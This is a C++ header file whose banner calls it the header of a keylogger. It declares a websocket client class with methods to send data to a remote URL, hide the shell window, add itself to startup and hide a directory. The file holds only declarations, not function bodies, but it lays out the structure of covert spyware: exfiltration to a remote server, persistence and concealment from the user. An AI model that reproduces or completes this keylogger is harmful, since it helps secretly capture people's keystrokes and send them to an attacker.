/**
*
* | ============================================================ |
* |  Coded By : ZELROTH                                          |
* |  Date : 2024/12/9 - 9:57:14                                  |
* |  Header File OF KeyLogger                                    |
* |  Written In C++ And Python Programming Languages             |
* | ============================================================ |
*
**/


#ifndef WEBSOCKETCLIENT_H
#define WEBSOCKETCLIENT_H

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/client.hpp>
#include <boost/asio.hpp>
#include <boost/process.hpp>
#include <random>
#include <filesystem>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

using websocketpp::client;
using websocketpp::connection_hdl;

class WebSocketClient {
public:
    WebSocketClient(const std::string& url);
    void sendMessage(const std::string& message);
    void run();

private:
    static std::string generateRandomString(size_t length);
    void hideShell();
    void addToStartup(const std::string& file_path);
    void hideDirectory(const std::string& path);

    client<websocketpp::config::asio> client_instance;
    connection_hdl connection_hdl;
    std::string url;
};

#endif
